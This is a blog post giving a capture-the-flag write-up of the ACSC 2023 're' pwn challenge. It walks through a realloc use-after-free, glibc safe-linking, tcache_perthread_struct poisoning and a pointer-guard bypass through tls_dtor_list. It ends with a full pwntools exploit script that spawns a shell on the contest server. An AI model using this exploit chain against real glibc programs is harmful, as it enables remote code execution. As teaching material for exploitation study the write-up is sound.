[{"content":"[pwn 300] re authored by shift-crops\nSometimes you want to rewrite notes.\nGiven files:\nI didn\u0026rsquo;t manage to solve this challenge during contest but I\u0026rsquo;ve learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of tcache_perthread_struct, tls_dtor_list, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup.\nUnderstand the binary Let\u0026rsquo;s take a look at the source code given:\nre.c\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; static int getnline(char *buf, int size); static int getint(void); static void edit(void); struct Memo { size_t size; char* buf; } mlist[10]; __attribute__((constructor)) static int init(){ alarm(30); setbuf(stdin, NULL); setbuf(stdout, NULL); return 0; } int main(void){ for(;;){ printf(\u0026#34;\\nMENU\\n\u0026#34; \u0026#34;1. Edit\\n\u0026#34; \u0026#34;2. List\\n\u0026#34; \u0026#34;0. Exit\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); switch(getint()){ case 0: goto end; case 1: edit(); break; case 2: for(int i=0; i\u0026lt;sizeof(mlist)/sizeof(struct Memo); i++) if(mlist[i].size \u0026gt; 0 \u0026amp;\u0026amp; mlist[i].buf) printf(\u0026#34;[%d] %.*s\\n\u0026#34;, i, (int)mlist[i].size, mlist[i].buf); break; } } end: puts(\u0026#34;Bye.\u0026#34;); return 0; } static void edit(void){ unsigned idx, size; printf(\u0026#34;Index: \u0026#34;); if((idx = getint()) \u0026gt;= sizeof(mlist)/sizeof(struct Memo)){ puts(\u0026#34;Out of list\u0026#34;); return; } printf(\u0026#34;Size: \u0026#34;); if((size = getint()) \u0026gt; 0x78){ puts(\u0026#34;Too big memo\u0026#34;); return; } char *p = realloc(mlist[idx].buf, size); if(size \u0026gt; mlist[idx].size)\t// size and idx can be 0 mlist[idx].buf = p; mlist[idx].size = size; printf(\u0026#34;Memo: \u0026#34;); getnline(mlist[idx].buf, size); puts(\u0026#34;Done\u0026#34;); } static int getnline(char *buf, int size){ int len; if(size \u0026lt;= 0 || (len = read(STDIN_FILENO, buf, size-1)) \u0026lt;= 0) return -1; if(buf[len-1]==\u0026#39;\\n\u0026#39;) len--; buf[len] = \u0026#39;\\0\u0026#39;; return len; } static int getint(void){ char buf[0x10] = {}; getnline(buf, sizeof(buf)); return atoi(buf); } We have an array of 10 notes of size 0-0x78. We can edit or show note\u0026rsquo;s content. edit() is more noticable that implemented using realloc(), and input size can be 0 so we can free() chunk of the note, but pointer is not cleared from note after free(). So in summary we can use edit() to:\nAllocate new chunk for empty note Allocate new bigger chunk for smaller note. Edit note\u0026rsquo;s content Free chunk, with pointer remained Leak heap base We can abuse the above finding to leak heap base by freeing a chunk that another idx point to.\n1 2 3 4 5 6 # leak heap base edit(0, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) edit(1, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) list() Glibc-2.32\u0026rsquo;s Safe Linking https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\nNote that what we leaked is an encrypted form of chunk\u0026rsquo;s fd:\n1 2 3 4 5 6 7 pwndbg\u0026gt; tel \u0026amp;mlist 00:0000│ 0x558f84585040 (mlist) ◂— 0x0 01:0008│ 0x558f84585048 (mlist+8) —▸ 0x558f84b632a0 ◂— 0x558f84b63 02:0010│ 0x558f84585050 (mlist+16) ◂— 0x60 /* \u0026#39;`\u0026#39; */ 03:0018│ 0x558f84585058 (mlist+24) —▸ 0x558f84b632a0 ◂— 0x558f84b63 04:0020│ 0x558f84585060 (mlist+32) ◂— 0x0 ... ↓ 3 skipped This is because of glibc-2.32\u0026rsquo;s safe linking1.\nSafe linking is a security mechanism to protect malloc()\u0026rsquo;s single-linked lists from tampering by attacker.\nIn this case we encounter this protection when allocate and free tcache chunk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s room for more chunks. */ static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); /* Mark this chunk as \u0026#34;in the tcache\u0026#34; so the test in _int_free will detect a double free. */ e-\u0026gt;key = tcache_key; e-\u0026gt;next = PROTECT_PTR (\u0026amp;e-\u0026gt;next, tcache-\u0026gt;entries[tc_idx]); tcache-\u0026gt;entries[tc_idx] = e; ++(tcache-\u0026gt;counts[tc_idx]); } /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s available chunks to remove. */ static __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u0026gt;entries[tc_idx]; if (__glibc_unlikely (!aligned_OK (e))) malloc_printerr (\u0026#34;malloc(): unaligned tcache chunk detected\u0026#34;); tcache-\u0026gt;entries[tc_idx] = REVEAL_PTR (e-\u0026gt;next); --(tcache-\u0026gt;counts[tc_idx]); e-\u0026gt;key = 0; return (void *) e; } Compare with glibc-2.31\u0026rsquo;s malloc, we notice that tcache chunk\u0026rsquo;s fd is encrypted and decrypted with PROTECT_PTR() and REVEAL_PTR()\n1 2 3 #define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) \u0026gt;\u0026gt; 12) ^ ((size_t) ptr))) #define REVEAL_PTR(ptr) PROTECT_PTR (\u0026amp;ptr, ptr) For example, if we free 2 chunk in same bin:\n1 2 3 4 edit(0, 0x10, b\u0026#39;a\u0026#39;) edit(1, 0x10, b\u0026#39;a\u0026#39;) edit(0, 0) edit(1, 0) 1 2 3 4 5 pwndbg\u0026gt; x/10gx 0x55a3c2778290 0x55a3c2778290: 0x0000000000000000 0x0000000000000021 0x55a3c27782a0: 0x000000055a3c2778 0x40d9bbe86fa3873a 0x55a3c27782b0: 0x0000000000000000 0x0000000000000021 0x55a3c27782c0: 0x000055a6984ba5d8 0x40d9bbe86fa3873a The above fd is calculated by PROTECT_PTR():\n1 2 3 4 5 In [3]: hex((0x55a3c27782a0\u0026gt;\u0026gt;12)^0) Out[3]: \u0026#39;0x55a3c2778\u0026#39; In [4]: hex((0x55a3c27782c0\u0026gt;\u0026gt;12)^0x55a3c27782a0) Out[4]: \u0026#39;0x55a6984ba5d8\u0026#39; And if we allocate using tcache bin, next entry is resolved using REVEAL_PTR():\n1 2 In [5]: hex((0x55a3c27782c0\u0026gt;\u0026gt;12)^0x000055a6984ba5d8) Out[5]: \u0026#39;0x55a3c27782a0\u0026#39; tcache-\u0026gt;entries[tc_idx] is equal to zero when the bin is empty (the first time a chunk is inserted into that bin). Thereby, what we leak is equivalent to heap_base\u0026gt;\u0026gt;12\nLeak libc base and control tcache_perthread_struct Now we have heap address.\nMy first approach during ctf is to insert a big chunk to unsorted bin and leak libc base. Even after I finished the former, it consumed up 9 note slots, thus I couldn\u0026rsquo;t leak libc base.\nAfter reading nyancat\u0026rsquo;s writeup, I notice the existence of tcache_perthread_struct which is the first chunk allocated on heap. If we could control the tcache struct, we could do a lot of magic.\nFirst prepare tcache poisoning to allocate 2 chunks at tcache_perthread_struct. Note that we overwrite fd with PROTECT_PTR(tcache_perthead_struct).\n1 2 3 4 5 6 7 8 9 10 # tcache poisoning to alloc 2 chunks at tcache_perthead_struct edit(0, 0x60, p64(0)*2) edit(0, 0) edit(0, 0x60, p64(protect(heap_base+0x10))) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(protect(heap_base+0x10))) Then set 0x290 bin size to 7, free it to put it to unsorted bin (fastbin\u0026rsquo;s max bin size is 0xa0) and leak libc base. We fill up the 0x290 bin since tcache_perthread_struct\u0026rsquo;s size is 0x290 and we can free it right away without crafting big chunk.\n1 2 3 4 5 6 edit(3, 0x60, p64(0)) edit(4, 0x60, p64(0) + p64(0x200000000)) edit(5, 0x70, p64(0)) edit(6, 0x70, p16(0)*0x27 + p16(7)) edit(4, 0) list() tls_dtor_list From glibc-2.32, __malloc_hook and __free_hook were removed so we used tls_dtor_list to prepare a function call when program exit().\nexit() is a wrapper of __run_exit_handlers(), which will call __call_tls_dtors() if tls_dtor_list variable is not NULL.\n1 2 3 4 5 6 7 8 9 10 11 __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { /* First, call the TLS destructors. */ #ifndef SHARED if (\u0026amp;__call_tls_dtors != NULL) #endif if (run_dtors) __call_tls_dtors (); //[truncated...] } Pointer mangling 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /* Call the destructors. This is called either when a thread returns from the initial function or when the process exits via the exit function. */ void __call_tls_dtors (void) { while (tls_dtor_list) { struct dtor_list *cur = tls_dtor_list; dtor_func func = cur-\u0026gt;func; #ifdef PTR_DEMANGLE PTR_DEMANGLE (func); #endif tls_dtor_list = tls_dtor_list-\u0026gt;next; func (cur-\u0026gt;obj); /* Ensure that the MAP dereference happens before l_tls_dtor_count decrement. That way, we protect this access from a potential DSO unload in _dl_close_worker, which happens when l_tls_dtor_count is 0. See CONCURRENCY NOTES for more detail. */ atomic_fetch_add_release (\u0026amp;cur-\u0026gt;map-\u0026gt;l_tls_dtor_count, -1); free (cur); } } As you can see if we can tamper tls_dtor_list, program will eventually call func(cur-\u0026gt;obj) of our choice.\nThere\u0026rsquo;s one thing to overcome that function pointer in __call_tls_dtors() is passed to PTR_DEMANGLE() before being called.\nPTR_MANGLE() works by XORing the pointer with a 64bit secret thread data (fs:0x30), then performing a bitwise left rotation of 0x11 bits (on x86-64). PTR_DEMANGLE() is the reverse. 23\n1 2 3 4 5 6 7 8 9 10 11 12 # define PTR_MANGLE(var)\tasm (\u0026#34;xor %%fs:%c2, %0\\n\u0026#34;\t\\ \u0026#34;rol $2*\u0026#34; LP_SIZE \u0026#34;+1, %0\u0026#34;\t\\ : \u0026#34;=r\u0026#34; (var)\t\\ : \u0026#34;0\u0026#34; (var),\t\\ \u0026#34;i\u0026#34; (offsetof (tcbhead_t,\t\\ pointer_guard))) # define PTR_DEMANGLE(var)\tasm (\u0026#34;ror $2*\u0026#34; LP_SIZE \u0026#34;+1, %0\\n\u0026#34;\t\\ \u0026#34;xor %%fs:%c2, %0\u0026#34;\t\\ : \u0026#34;=r\u0026#34; (var)\t\\ : \u0026#34;0\u0026#34; (var),\t\\ \u0026#34;i\u0026#34; (offsetof (tcbhead_t,\t\\ pointer_guard))) That secret value is store in Thread Local Storage (namely pointer_guard, below canary).\nWith these above targets, we can control tcache_perthread_struct to point entriy of 2 size to tls_dtor_list and pointer_guard to bypass PTR_DEMANGLE() and point tls_dtor_list to a crafted dtor_list.\n1 2 3 4 5 edit(0, 0x78, p16(1)*(0x70//2)) # overwrite tcache-\u0026gt;counts edit(1, 0x78, p64(tls_dtor_list) + p64(pointer_guard) + p64(rol(lib.sym[\u0026#39;system\u0026#39;], 0x11, 64)) + p64(binsh)) # overwrite tcache-\u0026gt;entries edit(7, 0x20, p64(0)) # overwrite pointer_guard edit(8, 0x18, p64(0) + p64(fake_dtor_list)) # point to fake dtor_list Full exploit code solve.py\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 #!/usr/bin/env python3 from pwn import * # context.terminal = [\u0026#39;cmd.exe\u0026#39;, \u0026#39;/c\u0026#39;, \u0026#39;start\u0026#39;, \u0026#39;wsl.exe\u0026#39;, \u0026#39;-d\u0026#39;, \u0026#39;Debian\u0026#39;, \u0026#39;bash\u0026#39;, \u0026#39;-c\u0026#39;] context.arch = \u0026#39;amd64\u0026#39; host = \u0026#39;re.chal.ctf.acsc.asia\u0026#39; port = 9999 elf_name = \u0026#39;./chall\u0026#39; elf = ELF(elf_name) lib = ELF(\u0026#39;./libc.so.6\u0026#39;) script = \u0026#39;\u0026#39;\u0026#39; breakrva 0x000000000001409 breakrva 0x000000000001491 # dir /home/daccong/glibc-2.35/malloc/ # dir /home/daccong/glibc-2.35/stdlib # dir /home/daccong/glibc-2.35/sysdeps/nptl c \u0026#39;\u0026#39;\u0026#39; # script+=\u0026#39;c\\n\u0026#39;*8 # script += \u0026#39;b __libc_malloc\\n\u0026#39; # script+=\u0026#39;b tcache_get\\n\u0026#39; # script += \u0026#39;b __call_tls_dtors\\n\u0026#39; # script += \u0026#39;b *__libc_start_call_main+130\\n\u0026#39; if args.LOCAL: p = process(elf_name) elif args.GDB: # p = process(elf_name) # gdb.attach(p, gdbscript=script) p = gdb.debug(elf_name, gdbscript=script) else: p = remote(host, port) def edit(idx, size, memo=b\u0026#39;\u0026#39;): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;: \u0026#39;, str(idx).encode()) p.sendlineafter(b\u0026#39;: \u0026#39;, str(size).encode()) if memo != b\u0026#39;\u0026#39;: p.sendafter(b\u0026#39;: \u0026#39;, memo) def list(): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) \u0026#39;\u0026#39;\u0026#39; addr_current: addr of current chunk\u0026#39;s fd addr_fd: addr of next chunk\u0026#39;s fd current: current chunk\u0026#39;s fd \u0026#39;\u0026#39;\u0026#39; def protect(addr_current, addr_fd): return (addr_current\u0026gt;\u0026gt;12)^addr_fd # basically (heap_base\u0026gt;\u0026gt;12)^addr_fd def reveal(addr_current, current): return (addr_current\u0026gt;\u0026gt;12)^current # basically (heap_base\u0026gt;\u0026gt;12)^current def protect(addr_fd): return (heap_base\u0026gt;\u0026gt;12)^addr_fd def reveal(current): return (heap_base\u0026gt;\u0026gt;12)^current rol = lambda val, r_bits, max_bits: \\ (val \u0026lt;\u0026lt; r_bits%max_bits) \u0026amp; (2**max_bits-1) | \\ ((val \u0026amp; (2**max_bits-1)) \u0026gt;\u0026gt; (max_bits-(r_bits%max_bits))) # leak heap base edit(0, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) edit(1, 0x60, b\u0026#39;a\u0026#39;) edit(0, 0) list() p.recvuntil(b\u0026#39;[1] \u0026#39;) heap_base = u64(p.recv(5).ljust(8, b\u0026#39;\\x00\u0026#39;)) \u0026lt;\u0026lt; 12 log.info(\u0026#39;heap base:\u0026#39; + hex(heap_base)) # tcache poisoning to alloc 2 chunks at tcache_perthread_struct edit(0, 0x60, p64(0)*2) edit(0, 0) edit(0, 0x60, p64(protect(heap_base+0x10))) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(0)*2) edit(2, 0) edit(2, 0x70, p64(protect(heap_base+0x10))) # alloc 2 chunk at tcache struct, set bin 0x290 (tcache struct\u0026#39;s size) to 7, then if I free one of the two prepared, it will be put into unsorted bin # thus lib base can be leaked edit(3, 0x60, p64(0)) edit(4, 0x60, p64(0) + p64(0x200000000)) edit(5, 0x70, p64(0)) edit(6, 0x70, p16(0)*0x27 + p16(7)) edit(4, 0) list() p.recvuntil(b\u0026#39;[6] \u0026#39;) lib_base = u64(p.recv(6) + b\u0026#39;\\x00\\x00\u0026#39;) - 0x219ce0 log.info(\u0026#39;lib base: \u0026#39; + hex(lib_base)) lib.address = lib_base # fix tcache struct (it is messy now) # edit(4, 0x70, p16(0)*30) # no need to fix # poison tcache again to create fake dtor_list item (-8 for alignment check) tls_dtor_list = lib_base - 0x2918 - 8 pointer_guard = lib_base - 0x2890 binsh = 0x00000000001d8698 + lib_base fake_dtor_list = heap_base + 0xa0 log.info(\u0026#34;tls_dtor_list: \u0026#34; + hex(tls_dtor_list)) log.info(\u0026#34;pointer_guard: \u0026#34; + hex(pointer_guard)) edit(0, 0x78, p16(1)*(0x70//2)) # overwrite tcache-\u0026gt;counts edit(1, 0x78, p64(tls_dtor_list) + p64(pointer_guard) + p64(rol(lib.sym[\u0026#39;system\u0026#39;], 0x11, 64)) + p64(binsh)) # overwrite tcache-\u0026gt;entries edit(7, 0x20, p64(0)) # overwrite pointer_guard edit(8, 0x18, p64(0) + p64(fake_dtor_list)) # write fake dtor_list item p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;0\u0026#39;) p.interactive() # ACSC{r34ll0c_15_n07_ju57_r34ll0c473} https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://blog.infosectcbr.com.au/2020/04/bypassing-pointer-guard-in-linuxs-glibc.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","description":"","id":0,"section":"posts","tags":["pwn"],"title":"ACSC 2023 writeup: re","uri":"https://sulaidat.github.io/blog/posts/2023-44-28-acsc2023/"}]